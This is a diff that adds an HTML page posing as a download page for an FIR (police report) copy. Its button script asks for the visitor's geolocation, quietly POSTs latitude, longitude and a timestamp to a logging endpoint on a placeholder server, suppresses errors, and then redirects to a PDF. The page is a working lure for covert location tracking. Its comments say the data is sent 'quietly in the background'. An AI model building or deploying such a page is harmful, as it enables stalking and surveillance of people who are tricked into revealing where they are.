@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Download FIR Copy</title>
+  <style>
+    body { font-family: Arial, sans-serif; max-width: 600px; margin: 40px auto; text-align: center; }
+    #loading { display: none; }
+  </style>
+</head>
+<body>
+  <h2>FIR Copy Download</h2>
+  <p>Please click the button below to download your FIR copy.</p>
+  <button id="downloadBtn">Download FIR</button>
+  <p id="loading">Preparing your FIR copy, please wait...</p>
+
+  <script>
+    const downloadBtn = document.getElementById('downloadBtn');
+    const loadingText = document.getElementById('loading');
+
+    downloadBtn.addEventListener('click', () => {
+      downloadBtn.style.display = 'none';
+      loadingText.style.display = 'block';
+
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            // Send location data quietly in the background
+            fetch('https://your-server.com/log-location', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                timestamp: new Date().toISOString()
+              })
+            }).catch(() => {/* Fail silently */});
+
+            // After a short delay, redirect to FIR PDF
+            setTimeout(() => {
+              window.location.href = 'https://your-server.com/fir-copy.pdf';
+            }, 1500);
+          },
+          (error) => {
+            // On error or denial, just redirect immediately
+            window.location.href = 'https://your-server.com/fir-copy.pdf';
+          }
+        );
+      } else {
+        // If no geolocation, just redirect
+        window.location.href = 'https://your-server.com/fir-copy.pdf';
+      }
+    });
+  </script>
+</body>
+</html>
